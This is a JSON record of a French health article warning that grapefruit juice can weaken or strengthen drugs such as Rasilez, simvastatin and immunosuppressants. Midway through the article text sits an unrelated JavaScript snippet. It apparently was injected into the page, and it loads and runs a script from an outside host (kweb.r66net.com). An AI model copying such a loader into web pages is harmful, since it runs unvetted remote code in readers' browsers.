{"title": "Jus de pamplemousse et medicament : un cocktail a eviter", "newspaper": "Futura Sciences", "author": [" Destination Sante"], "date_publi": "2017-08-26", "content": "Surprenante information que Futura diffusait en 2011 mais qu'il n'est peut-etre pas inutile de rappeler, a l'heure ou l'on vient d'apprendre qu'un  exces de vitamine B  n'est sans doute pas bon. Le jus de pamplemousse ne doit pas etre associe a certains medicaments. L'Afssaps rappelait en effet que ce jus de fruit peut interagir avec des molecules actives, en augmentant ou en diminuant leur action. Comme toujours, veillez donc a bien lire la notice du medicament ! Article publie le 5 mai 2011 Ce n'est pas nouveau mais le phenomene tend a se repandre : il est pour le moins problematique, voire dangereux de boire du jus de pamplemousse en prenant certains medicaments. L'Agence francaise de securite sanitaire des produits de sante ( Afssaps ) attire aujourd'hui l'attention du grand public sur le danger -- meconnu jusqu'ici -- de l'associer avec le Rasilez, un traitement contre l' hypertension arterielle . Quand il est dit de prendre un medicament avec de l'eau, suivez le conseil... La prise de  jus de pamplemousse  en effet, provoquerait une diminution importante de la concentration du Rasilez dans le sang. Ce qui, bien sur, reduit d'autant l'efficacite du traitement... Ce nouvel exemple des interactions possibles entre le jus de pamplemousse et des medicaments, s'inquiete l'Agence. Voir aussi : Notre dossier sur le cycle du medicament  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Toujours lire la notice L'Afssaps rappelle en effet qu'il ne s'agit pas d'un phenomene nouveau. Et surtout que la maniere dont se manifestent ces interactions est tres inegale. Par exemple, <<  la prise de jus de pamplemousse avec les medicaments utilises pour faire baisser le taux de  cholesterol  dans le sang (simvastatine...) peut, au contraire du phenomene observe avec le Rasilez, multiplier par quinze l' absorption  du medicament et provoquer des atteintes musculaires graves  >>. Que le jus de pamplemousse inhibe ou potentialise l'effet des medicaments, c'est deja preoccupant. Il s'avere egalement qu'il peut entrainer des atteintes graves. L'Afssaps rappelle ainsi que <<  la consommation reguliere de jus de pamplemousse avec des  medicaments immunosuppresseurs , preconises contre les  rejets de greffes  (tacrolimus, ciclosporine...), peut endommager le rein  >>. En conclusion, si vous etes concerne par la prise d'un de ces traitements, <<  evitez de boire du  jus de pamplemousse  dans les deux heures precedant la prise de votre traitement, et limitez votre consommation a moins d'un quart de litre par jour  >>. Et naturellement, lisez toujours la notice avant de prendre un medicament, quel qu'il soit. ", "theme": "sante"}